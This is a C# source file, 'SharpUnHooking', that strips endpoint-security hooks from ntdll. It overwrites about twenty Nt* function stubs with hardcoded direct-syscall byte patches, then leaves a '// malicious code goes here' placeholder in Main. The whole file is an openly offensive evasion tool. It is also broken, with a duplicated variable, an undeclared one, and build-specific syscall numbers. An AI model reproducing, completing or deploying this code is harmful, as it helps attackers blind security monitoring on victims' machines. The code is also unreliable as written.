using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace SharpUnHooking
{
    class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static private void CleanUp()
        {
            IntPtr dllHandle = LoadLibrary("ntdll.dll");
            IntPtr NtProtectVirtualMemory = GetProcAddress(dllHandle, "NtProtectVirtualMemory");
            IntPtr NtReadVirtualMemory = GetProcAddress(dllHandle, "NtReadVirtualMemory");
            IntPtr NtAllocateVirtualMemoryEx = GetProcAddress(dllHandle, "NtAllocateVirtualMemoryEx");
            IntPtr NtDeviceIoControlFile = GetProcAddress(dllHandle, "NtDeviceIoControlFile");
            IntPtr NtGetContextThread = GetProcAddress(dllHandle, "NtGetContextThread");
            IntPtr NtMapViewOfSection = GetProcAddress(dllHandle, "NtMapViewOfSection");
            IntPtr NtMapViewOfSectionEx = GetProcAddress(dllHandle, "NtMapViewOfSectionEx");
            IntPtr NtQueryInformationThread = GetProcAddress(dllHandle, "NtQueryInformationThread");
            IntPtr NtQueueApcThread = GetProcAddress(dllHandle, "NtQueueApcThread");
            IntPtr NtQueueApcThreadEx = GetProcAddress(dllHandle, "NtQueueApcThreadEx");
            IntPtr NtReadVirtualMemory = GetProcAddress(dllHandle, "NtReadVirtualMemory");
            IntPtr NtResumeThread = GetProcAddress(dllHandle, "NtResumeThread");
            IntPtr NtSetContextThread = GetProcAddress(dllHandle, "NtSetContextThread");
            IntPtr NtSetInformationProcess = GetProcAddress(dllHandle, "NtSetInformationProcess");
            IntPtr NtSetInformationThread = GetProcAddress(dllHandle, "NtSetInformationThread");
            IntPtr NtSuspendThread = GetProcAddress(dllHandle, "NtSuspendThread");
            IntPtr NtUnmapViewOfSection = GetProcAddress(dllHandle, "NtUnmapViewOfSection");
            IntPtr NtUnmapViewOfSectionEx = GetProcAddress(dllHandle, "NtUnmapViewOfSectionEx");
            IntPtr NtWriteVirtualMemory = GetProcAddress(dllHandle, "NtWriteVirtualMemory");

            PatchHook(NtProtectVirtualMemory, 0x50, 0x00);
            PatchHook(NtAllocateVirtualMemory, 0x18, 0x00);
            PatchHook(NtAllocateVirtualMemoryEx, 0x76, 0x00);
            PatchHook(NtDeviceIoControlFile, 0x7, 0x00);
            PatchHook(NtGetContextThread, 0xf2, 0x00);
            PatchHook(NtMapViewOfSection, 0x28, 0x00);
            PatchHook(NtMapViewOfSectionEx, 0x14, 0x01);
            PatchHook(NtQueryInformationThread, 0x25, 0x00);
            PatchHook(NtQueueApcThread, 0x45, 0x00);
            PatchHook(NtQueueApcThreadEx, 0x65, 0x01);
            PatchHook(NtReadVirtualMemory, 0x3f, 0x00);
            PatchHook(NtResumeThread, 0x52, 0x00);
            PatchHook(NtSetContextThread, 0x8b, 0x01);
            PatchHook(NtSetInformationProcess, 0x1c, 0x00);
            PatchHook(NtSetInformationThread, 0x0d, 0x00);
            PatchHook(NtSuspendThread, 0xbc, 0x01);
            PatchHook(NtUnmapViewOfSection, 0x2a, 0x00);
            PatchHook(NtUnmapViewOfSectionEx, 0xcc, 0x01);
            PatchHook(NtWriteVirtualMemory, 0x3a, 0x00);
        }

        static private void PatchHook(IntPtr address, byte syscall, byte high)
        {
            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint OldProtection;
            byte[] patch = new byte[] { 0x4c, 0x8b, 0xd1, 0xb8, syscall, high, 0x00, 0x00, 0x0f, 0x05, 0xc3};
            int length = patch.Length;

            VirtualProtect(address, (uint)length, PAGE_EXECUTE_READWRITE, out OldProtection);
            Marshal.Copy(patch, 0, address, length);
        }
        static void Main(string[] args)
        {
            CleanUp();
            Console.WriteLine("Clean Up Completed");

            // malicious code goes here

        }
    }
}
